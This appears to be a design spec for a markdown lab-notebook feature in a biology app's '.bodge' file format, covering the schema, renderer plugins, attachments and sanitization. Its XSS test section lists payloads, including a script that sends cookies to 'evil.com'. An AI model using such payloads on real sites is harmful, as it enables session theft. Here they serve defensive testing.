# SPEC_BODGE_NOTEBOOK_MARKDOWN.md — markdown lab journal внутри `.bodge` v2

> **Тип задачи:** A (UI + data + bundle integration). Размер ~30 KB.
> **Решения Игоря (19.05.2026, переписывание):**
> - `CanvasLayoutView.jsx` hard-breach (41.35 KB, TD-SIZE Active) — допустимо под ответственность Игоря. K16 интегрирует notebook tab в CanvasLayoutView без pre-step декомпозиции; файл вырастет до ~42-43 KB (углубление breach).
> - Future-proof scaffolding выпилен: `embargo` на entries, kinds `protocol` / `result`, `author.email` / `author.orcid` — исключены из v2.0.0. Когда понадобится — semver-minor bump (forward-compatible).
> **Связь:** реализует `notebook/` раздел из `SPEC_BODGE_FORMAT_V2_CORE.md` §2. Реализуется ПОСЛЕ приёмки M-FORMAT-V2-CORE. Зависит на CORE K6-K7 (ZIP v2 reader/writer).
> **Сессионная стоимость:** Sprint M-FORMAT-V2-NOTEBOOK (Code, не лимитирован по срокам). Бундл markdown стека +60 KB gzipped (lazy на mount notebook tab) + KaTeX +250 KB gzipped (lazy на first formula detect).

---

## 0. Где задача сядет (карта связей)

### 0.1 Existing код, который меняется

| Файл | Изменение |
|------|-----------|
| `lib/bodge-zip.js` | Расширение reader/writer на `notebook/entries.json` + `notebook/attachments/*` + `attachmentsManifest` (зависит на CORE K6-K7) |
| `store/skeleton-store.js` | Новый slice `state.notebook` — `{entries: [], attachmentsRuntime: Map<attId, {blobUrl, blob, manifest}>}` (attachments как blob URLs — runtime-only, не персистентны) |
| `store/skeleton-state.js` | НЕТ изменений к существующему state shape (миграция не требуется, только добавление optional slice) |
| `CanvasLayoutView.jsx` (41.35 KB hard-breached) | **Расширение под ответственность Игоря** — добавление notebook tab mount + lazy-load (~50-100 строк дополнительно, рост до ~42-43 KB) |
| `EditorWindowShell.jsx` | Расширение tab-list (notebook tab появляется при `state.notebook.entries.length > 0` ИЛИ кнопка «+ Журнал» на canvas) |
| Right panel из T10 — `SangerLabNotebook.jsx` | Extend: click на clone row → opens соответствующий notebook entry в modal/tab (вместо inline notes edit) |
| `package.json` | +5 deps: markdown-it, markdown-it-task-lists, markdown-it-footnote, markdown-it-mark, isomorphic-dompurify. KaTeX лениво через dynamic import |

### 0.2 Existing модули на которые опирается (не меняет)

- `lib/uuidv7.js` — для entry ID + attachment ID.
- `lib/hotkeys.js` — для notebook editor scope hotkeys.
- `state.containers[] / zones[] / operations[] / pieces[] / primers / externalRefs` — для ref display label resolver.
- `op.materializedClones[]` (T9) + `op.materializedClones[].notes` (T10) — для migration §14.
- DESIGN_SYSTEM.md tokens — для colour palette в DNA/AA highlight + UI surfaces.

### 0.3 Новые модули NOTEBOOK

- `lib/markdown-renderer.js` — singleton + sanitization pipeline.
- `lib/markdown-ref-plugin.js` — custom `@@ref@@` tokenizer + renderer.
- `lib/markdown-dna-highlight-plugin.js` — DNA/AA syntax highlight в fenced code blocks.
- `lib/markdown-mermaid-link-plugin.js` — external editor stub.
- `lib/bodge-notebook-json.js` — entries.json read/write + validation.
- `lib/bodge-attachments.js` — attachments lifecycle (load/revoke/upload/compress).
- `lib/notebook-migrations/t10-to-notebook.js` — T10 Sanger notes migration.
- `lib/image-compress.js` — Canvas-based PNG/JPEG recompression.
- `canvas/MarkdownView.jsx` — preview component (consumes renderer).
- `canvas/NotebookEntryEditor.jsx` — split-view editor (textarea + preview).
- `canvas/NotebookToolbar.jsx` — toolbar buttons.
- `canvas/NotebookList.jsx` + `canvas/NotebookSearch.jsx` — list + filter.
- `canvas/NotebookRefPickerModal.jsx` — entity picker для @@ref insertion.
- `hooks/useMarkdownRefResolver.js` — display label resolver hook (sets global resolver на mount).
- `hooks/useNotebookEntries.js` — selector + actions (CRUD entries).

JSON Schema: `schemas/bodge-notebook-v2.json` для external validators.

### 0.4 Что может сломаться

- **CanvasLayoutView.jsx размер.** +50-100 строк интеграции — файл вырастет с 41.35 KB до ~42-43 KB (hard-breach углубляется). Допустимо под ответственность Игоря.
- **T10 SangerLabNotebook flow.** Текущая UI «edit notes inline в right panel» расширяется до «click clone row → open notebook entry». Behavioral change — regression test обязателен (T10 + notebook integration).
- **Bundle size first-paint.** Notebook stack lazy через `const NotebookEntryEditor = lazy(() => import('./canvas/NotebookEntryEditor'))`. Биолог без notebook не платит. Verify через `vite build --analyze`.
- **XSS attack surface.** Любая user-input markdown проходит DOMPurify. Test suite XSS-scenarios обязателен (5 attack vectors, §12.3).
- **Attachment URL revoke leak.** 50 photos × 1 MB blob = 50 MB утечка memory при unmount без revoke. `useEffect` cleanup критичен (§4.2).

---

## 1. `notebook/entries.json` schema (slim version)

```json
{
  "$schema": "https://bodgegene.dev/schema/bodge-notebook-v2.json",
  "version": "2.0.0",
  "entries": [
    {
      "id": "nb01ENTRY01",
      "createdAt": "2026-05-14T09:30:00.000Z",
      "updatedAt": "2026-05-14T18:00:00.000Z",
      "author": { "name": "Igor", "deviceId": "01XYZ-device-uuid" },
      "kind": "free-text",
      "title": "PCR pET-28b — 14.05.2026",
      "text": "**Цель:** амплифицировать ...\n\n## Праймеры\n\n| ... | ... |\n\n![PCR gel](att01ABC.png)\n\nСм. @@ref:operation:op01PCR01@@",
      "tags": ["pcr", "pks4", "verified"],
      "refs": [
        { "kind": "operation", "id": "op01PCR01" },
        { "kind": "zone", "id": "zn01XYZABCDEF" }
      ],
      "attachments": ["att01ABCDEF", "att02DEFGHI"]
    },
    {
      "id": "nb02SANGER01",
      "createdAt": "2026-05-15T11:00:00.000Z",
      "updatedAt": "2026-05-15T11:00:00.000Z",
      "author": { "name": "Igor", "deviceId": "01XYZ-device-uuid" },
      "kind": "sanger",
      "title": "Sanger clone-1",
      "text": "Sequence verified, no mutations.\n\n**Quality:** 0.87\n\nPrimer used: T7-fwd",
      "tags": ["sanger", "verified"],
      "refs": [
        { "kind": "operation", "id": "op02GIBSON01" },
        { "kind": "clone", "id": "c11CLONE01" }
      ],
      "attachments": ["att03SANGER-AB1"],
      "data": {
        "sangerVerified": "verified",
        "primer": "T7-fwd",
        "qualityScore": 0.87,
        "discrepancies": [],
        "expectedSequence": "ATGAAGCTT...",
        "actualSequence": "ATGAAGCTT..."
      }
    }
  ],
  "attachmentsManifest": {
    "att01ABCDEF": {
      "displayName": "PCR gel 14.05.2026",
      "mimeType": "image/png",
      "size": 4521008,
      "uploadedAt": "2026-05-14T18:00:00.000Z",
      "compressed": true,
      "originalSize": 8200000
    },
    "att03SANGER-AB1": {
      "displayName": "clone-1 Sanger T7-fwd",
      "mimeType": "chemical/x-ab1",
      "size": 28567,
      "uploadedAt": "2026-05-15T11:00:00.000Z",
      "compressed": false
    }
  }
}
```

### 1.1 Entry fields

- **`id`** — `nb<uuidv7-prefix>` префикс для disambiguation.
- **`kind: "free-text" | "sanger"`** — два разрешённых kind в v2.0.0. Будущие kinds (`"protocol"` / `"result"`) — T-future, не реализуем.
- **`author: {name, deviceId}`** — name свободный текст. Email/ORCID отсутствуют (выпилены из CORE manifest, consistency).
- **`title`** — short human-readable, для UI list. Может быть empty («untitled entry»).
- **`text`** — markdown content (CommonMark + GFM + custom `@@ref@@`).
- **`tags: string[]`** — для grouping/filtering.
- **`refs: EntityRef[]`** — typed refs на BodgeGene entities (§1.2). Извлекаются автоматически при save из `@@ref@@` syntax в text, **плюс** могут быть явно добавлены без вхождения в text (для grouping).
- **`attachments: string[]`** — array attachment IDs. Каждый ID соответствует `notebook/attachments/<id>.<ext>` файлу.

**Что выпилено vs оригинала:**
- `embargo` поле — будущее supplementary materials publication-control, single-user не нужно.
- `author.email` / `author.orcid` — same.
- `kind: "protocol" | "result"` — упомянуто в оригинале как T-future, в v2.0.0 явно не support. Биолог использует `free-text` с tags.

### 1.2 Typed refs

```javascript
type EntityRef = {
  kind: "container" | "zone" | "operation" | "piece" | "primer" | "clone" | "external",
  id: string
};
```

- `container` — ref на `state.containers[]` record.
- `zone` — ref на `state.zones[]` record.
- `operation` — ref на `state.operations[]` record.
- `piece` — ref на `state.pieces[]` record.
- `primer` — ref на global pool primer record.
- `clone` — ref на `op.materializedClones[i].cloneId` (T9).
- `external` — ref на `state.externalRefs[]` (DOI / NCBI / AddGene из `refs/external.json`).

Inline markdown syntax: `@@ref:kind:id@@`. Renderer заменяет на clickable badge «→ display label».

### 1.3 Sanger entry — special case

Sanger entries имеют дополнительный `data` field (typed structure):
```javascript
data: {
  sangerVerified: "verified" | "failed" | "pending",
  primer: string | null,
  qualityScore: number | null,
  discrepancies: Array<{position: number, expected: string, actual: string}>,
  expectedSequence: string | null,
  actualSequence: string | null
}
```

**T10 panel UX расширение:**
- T10 SangerLabNotebook panel (right side, hotkey B) показывает `op.materializedClones[i]` rows.
- Click на clone row → если `clone.sangerNotebookEntryId` defined → open соответствующий notebook entry в modal/tab.
- Fallback к legacy inline notes edit если `notes` defined но `sangerNotebookEntryId` undefined (v0.8.3 файлы до migration).

### 1.4 `attachmentsManifest`

Map `attId → {displayName, mimeType, size, uploadedAt, compressed, originalSize?}`.

- `compressed: boolean` — был ли blob recompressed при upload (§4.1).
- `originalSize?: number` — присутствует только если `compressed: true`.

---

## 2. Markdown stack

### 2.1 Зависимости

```json
"dependencies": {
  ...existing,
  "markdown-it": "^14.1.0",
  "markdown-it-task-lists": "^2.1.1",
  "markdown-it-footnote": "^4.0.0",
  "markdown-it-mark": "^4.0.0",
  "isomorphic-dompurify": "^2.16.0"
}
```

Bundle costs (gzipped):
- markdown-it core: ~25 KB.
- task-lists / footnote / mark plugins: ~6 KB total.
- isomorphic-dompurify: ~20 KB.
- Custom plugins (ref + dna + mermaid-link): ~9 KB наш код.
- **Total notebook stack: ~60 KB gzipped**, lazy на mount.
- KaTeX (опционально, lazy на first `$...$` detect): ~250 KB gzipped с шрифтами.

### 2.2 Renderer singleton

Module: `lib/markdown-renderer.js`. Entry points:

- **`getMarkdownRenderer() → MarkdownIt instance`** — lazy singleton. На first call создаёт MarkdownIt с `html: false`, `linkify: true`, `breaks: true`, `typographer: true`, регистрирует plugins (task-lists, footnote, mark, bodgeRefPlugin, dnaHighlightPlugin, mermaidLinkPlugin). На subsequent calls возвращает cached instance.

- **`async renderMarkdown(text, opts) → string` (sanitized HTML)** — main entry. Логика (5 шагов):
  1. Получить renderer через `getMarkdownRenderer()`.
  2. Detect `$...$` в тексте → lazy-load `markdown-it-katex` plugin через dynamic import, register one-shot (idempotent через `katexLoaded` flag).
  3. `md.render(text)` → raw HTML.
  4. `resolveAttachmentRefs(html, opts.attachments)` — replace `src="att<id>.<ext>"` на blob URL из runtime attachments map (см. §4). Missing attachment → `<img data-att-missing="true" alt="(missing)">` placeholder.
  5. `DOMPurify.sanitize(...)` с allowed tags whitelist (§12.2) и allowed attrs (`target`, `data-ref-kind`, `data-ref-id`, `data-att-id`, `data-att-missing`, `class`, `style` whitelist).

`html: false` блокирует raw HTML на parser-уровне (defense in depth, DOMPurify — output filter).

### 2.3 React component `<MarkdownView>`

Component: `canvas/MarkdownView.jsx`. Props:
- `text: string` — markdown content.
- `attachments: Map<attId, {blobUrl, manifest}>` — runtime attachment registry.
- `onRefClick: ({kind, id}) => void` — click handler для @@ref badges.
- `className?: string`.

Логика (4 шага):
1. `useState html`, `useEffect` re-renders при `[text, attachments]` change.
2. Async `await renderMarkdown(text, {attachments})` → set html. Cleanup flag для avoid stale set state на unmount.
3. Container `<div onClick={dispatchRefClick} dangerouslySetInnerHTML={{__html: html}} />`.
4. `dispatchRefClick(e)` — `e.target.closest('.md-ref')` → extract `data-ref-kind` / `data-ref-id` → `onRefClick({kind, id})` + `e.preventDefault()`.

`useMarkdownRefResolver()` hook (§3.2) — setup global resolver.

---

## 3. Custom `@@ref:kind:id@@` plugin

### 3.1 Tokenizer + renderer

Module: `lib/markdown-ref-plugin.js`. Entry point: `bodgeRefPlugin(md)` — markdown-it plugin.

Inline rule:
- Pattern `^@@ref:(?<kind>[a-z]+):(?<id>[a-zA-Z0-9_-]+)@@`.
- Срабатывание ДО `emphasis` rule (priority через `md.inline.ruler.before('emphasis', 'bodge_ref', ...)`).
- Token type `bodge_ref`, meta `{kind, id}`.

Renderer rule `md.renderer.rules.bodge_ref`:
- Lookup display label через global resolver (§3.2).
- Output `<button class="md-ref" data-ref-kind=".." data-ref-id=".." title="..">→ <escapedLabel></button>`.

### 3.2 Display label resolver

Module: `lib/markdown-ref-plugin.js` (тот же). Global variable `displayLabelResolver: (kind, id) => string`.

Hook: `hooks/useMarkdownRefResolver.js`. На mount устанавливает resolver через `setRefDisplayLabelResolver(...)`. Resolver читает `useStore.getState()` и резолвит по `kind`:

| kind | резолв |
|------|--------|
| `container` | `state.containers.find(c => c.id === id)?.name ?? id.slice(0, 8)` |
| `zone` | `state.zones.find(z => z.id === id)?.name ?? id.slice(0, 8)` |
| `operation` | `state.operations.find(o => o.id === id)` → `${op.kind} #${id.slice(2, 8)}` |
| `piece` | `state.pieces.find(p => p.id === id)?.name ?? id.slice(0, 8)` |
| `primer` | `state.primers.find(p => p.id === id)?.name ?? id.slice(0, 8)` |
| `clone` | `state.containers.find(c => c.id === id)?.name ?? clone ${id.slice(0, 6)}` |
| `external` | `state.externalRefs.find(r => r.id === id)?.title ?? accession ?? id.slice(0, 8)` |
| default | `id.slice(0, 8)` |

### 3.3 Click handler

В hosting editor (`NotebookEntryEditor`) — `handleRefClick({kind, id})` dispatch'ит:

| kind | action |
|------|--------|
| `container` | `OPEN_CONTAINER_EDITOR{containerId: id}` |
| `zone` | `FOCUS_ZONE{zoneId: id}` + scroll-to-zone |
| `operation` | `OPEN_OPERATION_EDITOR{operationId: id}` |
| `piece` | `FOCUS_PIECE{pieceId: id}` |
| `primer` | scroll global primer pool + highlight row |
| `clone` | `OPEN_CONTAINER_EDITOR{containerId: cloneId}` |
| `external` | `window.open(externalRef.url, '_blank', 'noopener')` |

### 3.4 Export plain (для public-supp profile)

Helper: `snapshotRefsToPlain(text, state) → string`. Regex replace `@@ref:(kind):(id)@@` → `getRefDisplayLabel(kind, id)` (через тот же resolver, но snapshot state, не runtime live).

В paper supplementary markdown остаётся valid CommonMark, refs становятся plain labels («pks4-knockout», «PCR-2», «frag-1»).

---

## 4. Attachment lifecycle (blob URLs)

Module: `lib/bodge-attachments.js`. Entry points:

- **`async loadAttachments(notebookEntries, attachmentsBlobs) → Map<attId, {blobUrl, blob, manifest}>`** — на open `.bodge` создаёт blob URL для каждого attachment. Read из `attachmentsBlobs` (raw bytes из ZIP) + `notebookEntries.attachmentsManifest` (metadata). Returns Map.

- **`revokeAttachments(attachmentsMap): void`** — на close project: `URL.revokeObjectURL(att.blobUrl)` для каждой entry. **Critical** — без revoke 50 photos × 1 MB blob = 50 MB утечка memory.

- **`async attachFileToNotebookEntry(file, attachmentsMap) → {attId, markdownSnippet}`** — upload flow (5 шагов):
  1. Detect mime type из `file.type`. Если `image/png` или `image/jpeg` → compress через `compressImage(file, {quality: 0.85, maxDim: 2400})`. Иначе сохранить as-is (blacklist §4.1).
  2. Generate `attId = 'att' + uuidv7().slice(...)` (lowercased).
  3. `URL.createObjectURL(blob)` для runtime URL.
  4. Append в attachmentsMap: `{blobUrl, blob, manifest: {displayName, mimeType, size, uploadedAt, compressed, originalSize?}}`.
  5. Return `{attId, markdownSnippet: '![<filename>](att<idSuffix>.<ext>)'}`.

### 4.1 Compression strategy

**Whitelist (auto-recompress на upload):**
- `image/png` → JPEG quality 85, max dim 2400px.
- `image/jpeg` → quality 85, max dim 2400px.

**Blacklist (никогда не recompress):**
- `chemical/x-ab1` (Sanger raw — bit-perfect critical).
- `application/pdf` (vendor protocols).
- `chemical/*` (bio data: FASTA, gb, etc.).
- `audio/*`, `video/*`.
- Любые binary с unknown mime.

Image compression — Canvas API на main thread, через helper `lib/image-compress.js::compressImage(file, opts) → Promise<Blob>`. Сигнатура: load Image element → scale to max dim сохраняя aspect → draw на canvas → `canvas.toBlob('image/jpeg', quality)`.

Opt-out PNG→JPEG conversion — checkbox в upload UI «Keep original PNG (no compression)». По умолчанию unchecked (compression on).

### 4.2 useEffect cleanup в notebook component

`NotebookEntryEditor` имеет `useEffect(() => () => revokeAttachments(state.notebook.attachmentsRuntime), [])` — на unmount notebook tab revoke все blob URLs. На close project — revoke через top-level lifecycle handler в `useEffect` в App-уровне.

При re-render между entries: blob URLs **переиспользуются** (не revoke per entry switch), только при unmount всего notebook раздела.

---

## 5. Editor UI (split-view)

### 5.1 Component structure

Component: `canvas/NotebookEntryEditor.jsx`. Layout: header (toolbar) + body (split-pane textarea + preview).

Props:
- `entry: NotebookEntry` — current entry.
- `onChange(entry): void` — propagate edits.
- `attachments: Map<attId, ...>` — runtime registry.
- `onAttachmentUpload: (file) => Promise<{attId, markdownSnippet}>` — through `attachFileToNotebookEntry`.
- `onRefPicker: () => Promise<{kind, id}>` — entity picker modal callback.

State:
- `text` (local, debounced flush в `onChange` через 500ms или blur, OR manual Save Ctrl+S immediate).
- `previewVisible` (toggle через 👁 button).
- `scrollPercent` (live sync, §6).

Refs:
- `textareaRef` — для caret + selection manipulation.
- `previewRef` — для scroll sync.

`useMarkdownRefResolver()` — устанавливает resolver на mount.

Handlers (proza):
- `handleTextChange` — `setText(newValue)` + propagate (debounced через 500ms).
- `handleTextareaScroll` — пересчёт `scrollPercent = scrollTop / (scrollHeight - clientHeight)`.
- `handleDrop` (§7.1) — files filter → image only → upload → insert markdown snippet at cursor.
- `handlePaste` (§7.2) — clipboard image detection → upload → insert.
- `handleRefClick` — §3.3.

### 5.2 Toolbar

Component: `canvas/NotebookToolbar.jsx`. 16 base buttons:

| id | icon | snippet | shortcut |
|----|------|---------|----------|
| bold | **B** | `**${sel}**` | Ctrl+B |
| italic | *I* | `_${sel}_` | Ctrl+I |
| strike | S | `~~${sel}~~` | — |
| mark | == | `==${sel}==` | — |
| h1 | H1 | `\n# ${sel}\n` | — |
| h2 | H2 | `\n## ${sel}\n` | — |
| h3 | H3 | `\n### ${sel}\n` | — |
| ul | • | `\n- ${sel}\n` | — |
| ol | 1. | `\n1. ${sel}\n` | — |
| task | ☐ | `\n- [ ] ${sel}\n` | — |
| link | 🔗 | `[${sel}](url)` | — |
| code | `< >` | `` `${sel}` `` | — |
| block-dna | DNA | ` ```dna\n${sel}\n``` ` | — |
| block-aa | AA | ` ```aa\n${sel}\n``` ` | — |
| table | ⊞ | (multi-line template) | — |
| footnote | fn | `[^${counter}]` | — |

Special buttons (отдельно от base):
- 📎 — attachment picker → `onAttachmentUpload`.
- @@ — ref picker → `onRefPicker`.
- 👁 — toggle preview.

Insert helper `insertAtCursor(textarea, snippet)` — реализация (3 шага): get selection range, `textarea.setRangeText(replacement, start, end, 'select')`, focus + dispatch input event.

### 5.3 Keyboard shortcuts

Через `useHotkey` со scope `'notebook-editor'`:
- `Ctrl+B` → bold.
- `Ctrl+I` → italic.
- `Ctrl+S` → save (flush text immediately, не дожидаясь debounce).

Scope активируется при focus в textarea, деактивируется на blur.

---

## 6. Live preview position sync

Логика (§5.1 handlers): textarea `onScroll` → percent calc → `setScrollPercent`. `useEffect` на `[scrollPercent, previewVisible]` → set `previewRef.scrollTop = percent * (preview.scrollHeight - preview.clientHeight)`.

Edge case: preview height отличается от textarea height (markdown rendering меняет размер — table может быть высокой против исходного `| ... |` text). Percent approximation работает «достаточно хорошо», точный line-to-line mapping — overkill, T-future polish.

---

## 7. Drag-drop image + paste

### 7.1 Drag-drop flow

Биолог делает скриншот геля (Win+Shift+S / Cmd+Shift+4), drag-drop файл в textarea. `handleDrop(e)`:
1. `e.preventDefault()`.
2. `Array.from(e.dataTransfer.files).filter(f => f.type.startsWith('image/'))`.
3. Для каждого file: `await onAttachmentUpload(file)` → получает `{attId, markdownSnippet}` → `insertAtCursor(textareaRef, '\n\n' + snippet + '\n')`.

### 7.2 Paste flow (Ctrl+V)

`handlePaste(e)`:
1. `Array.from(e.clipboardData.items).find(i => i.type.startsWith('image/'))`.
2. Если есть image item: `e.preventDefault()` + `getAsFile() → File`.
3. Generate filename `pasted-${Date.now()}.png`.
4. Same as drop: `await onAttachmentUpload(file)` → `insertAtCursor(textareaRef, snippet)`.

Если в clipboard нет image — paste handler не intercept, default text paste работает.

---

## 8. KaTeX lazy-loading

`renderMarkdown` (§2.2) detect `text.includes('$')` → dynamic import `markdown-it-katex` plugin + register one-shot. Idempotent через global `katexLoaded` flag — повторный detect не загружает.

Bundle impact: +250 KB gzipped (lazy). First-time latency: ~100-300 ms на современном железе. Subsequent — cached, instant.

Math syntax:
- Inline: `$E=mc^2$`.
- Block: `$$\frac{a}{b}$$` или `\begin{equation}...\end{equation}`.

Use cases биолога:
- `$[DNA] = \frac{A_{260} \times 50}{l}$ ng/µL` — concentration.
- `$T_m = 64.9 + 41 \times \frac{G+C-16.4}{N}$` — Tm formula.
- `$\frac{dN}{dt} = N \cdot \ln(2) / t_d$` — exponential growth.

---

## 9. Search filter

Component: `canvas/NotebookSearch.jsx`. Props: `entries[]`, `onFiltered(entries)`. Local state `query: string`. Filter logic: `useMemo` substring match (case-insensitive) по `entry.title`, `entry.text`, `entry.tags[]`. `useEffect` pushes filtered result к parent через `onFiltered`.

Highlight match в результатах — T-future polish, не core v2.0.0.

---

## 10. DNA/AA syntax highlight в code blocks

### 10.1 Plugin

Module: `lib/markdown-dna-highlight-plugin.js`. Entry point: `dnaHighlightPlugin(md)`.

Overrides `md.renderer.rules.fence`. Если `token.info.trim().toLowerCase() ∈ {dna, cdna, rna}` → DNA highlight branch. Если ∈ {aa, protein} → AA highlight branch. Иначе — delegate к default fence renderer (chained originally registered fence rule).

### 10.2 Colour palettes

**DNA/RNA (canonical biology palette):**

| Base | Colour |
|------|--------|
| A | `#3DA635` (green) |
| T / U | `#D62828` (red) |
| G | `#F77F00` (orange) |
| C | `#3D7EA6` (blue) |
| N | `#888888` (grey) |
| - | `#cccccc` (light grey, gap) |

**AA (BodgeGene scheme — по физико-химическим свойствам):**

| Group | AAs | Colour |
|-------|-----|--------|
| Hydrophobic | A V L I M F W P | `#888888` (grey) |
| Polar uncharged | S T C Y N Q | `#3DA635` (green) |
| Basic (positive) | K R H | `#3D7EA6` (blue) |
| Acidic (negative) | D E | `#D62828` (red) |
| Special | G | `#F77F00` (orange) |
| Stop | * | `#000000` (black) |

Render: `<pre class="seq-block seq-${lang}"><code>...</code></pre>`, где каждый char wrap в `<span style="color: ..."`>` если есть в palette, иначе bare. Newlines preserved через `\n` в output (CSS `white-space: pre`).

### 10.3 Use cases

````markdown
T7 промотор forward primer (35 nt):

```dna
ATACGACTCACTATAGGGGAATTGTGAGCGGATAAC
```

Protein product (28 aa):

```aa
MKLNTDSLGGICELQSAVQHFKHIVRGT*
```
````

Биолог видит coloured sequences прямо в журнале без перехода в SequenceView.

---

## 11. Mermaid-link stub

Module: `lib/markdown-mermaid-link-plugin.js`. Overrides `md.renderer.rules.fence` для `info ∈ {mermaid, mermaid-link}`.

Output: `<div class="mermaid-link-block">` с:
- Preview face — иконка 📊 + label «Mermaid diagram (N lines)».
- `<pre><code>` — raw mermaid source visible (escaped через `md.utils.escapeHtml`).
- Actions: `<button class="md-copy" data-content="<escaped>">📋 Copy</button>` + `<a href="https://mermaid.live/edit#<encoded>" target="_blank" rel="noopener">↗ Open in editor</a>`.

Use case: биолог пишет mermaid graph в notebook, в preview видит code block + кнопку «↗ Open in editor», которая открывает mermaid.live с pre-loaded source, рендерит, экспортирует PNG, drag-drop обратно в notebook как regular image attachment.

T-future: inline rendering через lazy-loaded Mermaid lib (~700 KB) — не v2.0.0, добавится отдельным sprint M-NOTEBOOK-MERMAID-INLINE.

---

## 12. Sanitization (DOMPurify) — defense in depth

### 12.1 Three layers

1. **Parser-level:** `markdown-it({ html: false })` — raw `<script>` tags не parses (markdown plain text).
2. **Plugin-level:** custom plugins (`bodgeRefPlugin`, `dnaHighlightPlugin`) escape user input через `md.utils.escapeHtml()`.
3. **Output-level:** `DOMPurify.sanitize(html, opts)` — strip anything potentially malicious после rendering.

### 12.2 DOMPurify config

Allowed tags whitelist: heading h1-h6, p, br, strong, em, mark, del, s, code, pre, a, img, ul, ol, li, table, thead, tbody, tr, th, td, blockquote, hr, sup, sub, button (для ref badges), span, input (для task list checkboxes).

Allowed attrs: `target`, `data-ref-kind`, `data-ref-id`, `data-att-id`, `data-att-missing`, `class`, `style` (с CSS whitelist через DOMPurify hooks), `href`, `src`, `alt`, `title`, `type` (для input).

Blocked: `<script>`, `<iframe>`, `<object>`, `<embed>`, `<style>`, inline event handlers (`onclick=`, `onerror=`, etc.), `javascript:` URLs, `data:` URLs кроме whitelisted MIME types.

### 12.3 XSS attack test scenarios

5 explicit cases в test suite `__tests__/notebook-xss.test.js`:

1. **Script injection.** Entry text contains `<script>fetch('https://evil.com/?cookie=' + document.cookie)</script>`. Expect: text rendered as escaped string «&lt;script&gt;...», network не вызывается.
2. **javascript: URL.** `[click](javascript:alert('xss'))`. Expect: link rendered с empty href или stripped attribute.
3. **Event handler injection.** `<img src="x" onerror="alert(1)">`. Expect: onerror stripped.
4. **Data-URL exploit.** `<a href="data:text/html,<script>...</script>">link</a>`. Expect: data-URL для HTML stripped.
5. **CSS expression.** `<div style="background: url(javascript:alert(1))">`. Expect: stripped.

Test suite обязателен (K2 deliverable).

---

## 13. Bundle budget

| Component | Gzipped | When loaded |
|-----------|---------|-------------|
| markdown-it core | 25 KB | on notebook tab mount (lazy) |
| markdown-it-task-lists | 2 KB | same |
| markdown-it-footnote | 3 KB | same |
| markdown-it-mark | 1 KB | same |
| isomorphic-dompurify | 20 KB | same |
| bodge-ref-plugin (наш) | 3 KB | same |
| dna-highlight-plugin (наш) | 5 KB | same |
| mermaid-link-plugin (наш) | 1 KB | same |
| **Notebook stack total** | **~60 KB** | **lazy on notebook tab open** |
| KaTeX (lazy²) | ~250 KB | first `$...$` detected |

Lazy strategy: `const NotebookEntryEditor = lazy(() => import('./canvas/NotebookEntryEditor'))`. Dynamic import всех markdown deps происходит вместе с notebook component. Биолог без notebook не платит.

Verify в K19: `npm run build` + `vite build --analyze` — notebook chunk должен быть отдельным async chunk, не в main bundle.

---

## 14. T10 Sanger notes migration

### 14.1 Backward compatibility

Existing `op.materializedClones[i].notes` (T10, plain text ≤500 chars) — это **valid markdown** (нет special chars обычно). Чтение работает без изменений в существующем codepath.

### 14.2 Forward migration

Module: `lib/notebook-migrations/t10-to-notebook.js`. Entry point: `migrateT10NotesToNotebook(state) → state` (idempotent).

Logic при open v0.8.x файл в v0.9.0 (post-NOTEBOOK release):
1. Detect для каждой op: `op.materializedClones[i].notes != null && op.materializedClones[i].sangerNotebookEntryId == null`.
2. Создать new notebook entry:
   - `id: 'nb' + uuidv7().slice(...)`.
   - `kind: 'sanger'`.
   - `title: 'Sanger ' + clone.label`.
   - `text: clone.notes ?? ''`.
   - `createdAt: clone.createdAt ?? new Date().toISOString()`.
   - `updatedAt: clone.createdAt ?? new Date().toISOString()`.
   - `author: state.metadata.author` (fallback `{name: 'Igor', deviceId: localStorage.deviceId}`).
   - `refs: [{kind: 'operation', id: op.id}, {kind: 'clone', id: clone.cloneId}]`.
   - `attachments: []`.
   - `data: {sangerVerified: clone.sangerVerified, primer: null, qualityScore: null, discrepancies: [], expectedSequence: null, actualSequence: null}`.
3. Set `op.materializedClones[i].sangerNotebookEntryId = entry.id`.
4. **Keep** `op.materializedClones[i].notes` field (deprecated, но readable) для back-compat в течение 1-2 версий.

T-future: remove `materializedClones[].notes` после v0.9.x acceptance + 1-2 версии живучести (semver-minor breaking, в release notes явно).

### 14.3 UI integration

T10 SangerLabNotebook panel остаётся (right side, hotkey B). При click на clone row:
- Если `clone.sangerNotebookEntryId` defined → open соответствующий notebook entry в modal/tab.
- Если `clone.notes` defined но `sangerNotebookEntryId` undefined → fallback inline edit (legacy v0.8.3 UX — биолог пока не открывал файл в v0.9, migration ещё не сработала).

Notebook становится «detailed view» для T10 quick-status panel.

---

## 15. K-точки для Code (Sprint M-FORMAT-V2-NOTEBOOK)

**K1 — Deps + bundle setup.** `npm install` markdown-it + plugins + isomorphic-dompurify. Verify bundle size +60 KB gzipped после lazy-loading notebook tab через `vite build --analyze`. +3 tests (smoke: render «hello», parse table, parse task list).

**K2 — `lib/markdown-renderer.js` singleton.** Implementation §2.2. `renderMarkdown(text, opts)` → sanitized HTML с blob URL resolution. +8 tests including 5 XSS scenarios (§12.3).

**K3 — `lib/markdown-ref-plugin.js`.** Custom `@@ref:kind:id@@` tokenizer + renderer (§3.1). Display label resolver (§3.2). +10 tests including 7 kind branches + default + escaping.

**K4 — `lib/markdown-dna-highlight-plugin.js`.** Custom `dna`/`aa`/`rna`/`protein` language highlighters (§10). +6 tests including edge cases (mixed case, gaps `-`, lowercase auto-uppercase в DNA).

**K5 — `lib/markdown-mermaid-link-plugin.js`.** External editor stub (§11). +3 tests (output structure + escape + URL encoding).

**K6 — `canvas/MarkdownView.jsx` React component.** §2.3 implementation + ref click handler dispatch. +5 tests (render, async update, ref click, stale state cleanup, missing attachment placeholder).

**K7 — Notebook attachments lifecycle.** `lib/bodge-attachments.js` (§4) — `loadAttachments` + `revokeAttachments` + `attachFileToNotebookEntry`. `lib/image-compress.js` — Canvas-based `compressImage`. +8 tests (PNG compression, JPEG compression, blacklist skip, AB1 bit-perfect preserve, blob URL lifecycle, revoke on unmount, missing attachment fallback, original-size metadata).

**K8 — `canvas/NotebookEntryEditor.jsx`.** Split-view textarea + preview (§5.1). Insert helpers (§5.3). +6 tests (text edit propagate, debounce flush, manual save Ctrl+S, preview update, ref click route, blur flush).

**K9 — `canvas/NotebookToolbar.jsx`.** 16 toolbar buttons + 3 keyboard shortcuts (§5.2-§5.3). +4 tests.

**K10 — Live preview position sync.** §6 scroll-percent calc + propagate. +2 tests (sync forward, edge case при empty preview).

